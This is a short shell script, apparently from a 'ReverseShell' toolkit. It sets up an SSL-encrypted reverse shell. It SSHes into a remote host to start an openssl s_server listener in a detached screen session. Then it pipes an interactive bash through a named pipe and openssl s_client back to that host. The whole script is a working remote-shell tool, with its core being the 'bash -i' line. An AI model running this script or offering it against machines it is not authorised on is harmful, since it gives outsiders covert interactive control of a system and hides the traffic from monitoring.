#!/bin/sh

BRED="\033[1;31m"
BYELLOW='\033[1;93m'
BORANGE='\033[01;38;5;214m'
BGREEN='\033[1;92m'
NOCOLOR='\033[0m'

cname=$1
installdir=~/.ReverseShell

if [ -f $installdir/$cname/$cname.cfg ]; then
	. $installdir/$cname/$cname.cfg
else
	echo "error: $cname config not found! please check $installdir or run reverseshell_configmaker.sh again!!"
	exit 2
fi

#Start the listener (with ssl) on our remote(receiver) host
ssh -t -p $sshport -l $sshuser $rhost "screen -dmS listener_$cname; screen -S listener_$cname -X stuff \"openssl s_server -quiet -key ~/.ReverseShell/$cname/key.pem -cert ~/.ReverseShell/$cname/cert.pem -port $rport\"`echo -ne '\015'`"
#Keep it clean.
rm -f /tmp/reversesocket_$cname 2> /dev/null
#Connect to our listener from our current host
mkfifo /tmp/reversesocket_$cname
#Allow the ssl server to Ketchup
sleep 1
echo -e "${BYELLOW}Connect to the screen ${BGREEN}listener_$cname${BYELLOW} on your listener host ($rhost)${NOCOLOR}"
#The Dresden Shuffle with bash
/bin/bash -i < /tmp/reversesocket_$cname 2>&1 | openssl s_client -quiet -connect $rhost:$rport > /tmp/reversesocket_$cname
#Keep firing!
rm -f /tmp/reversesocket_$cname 2> /dev/null
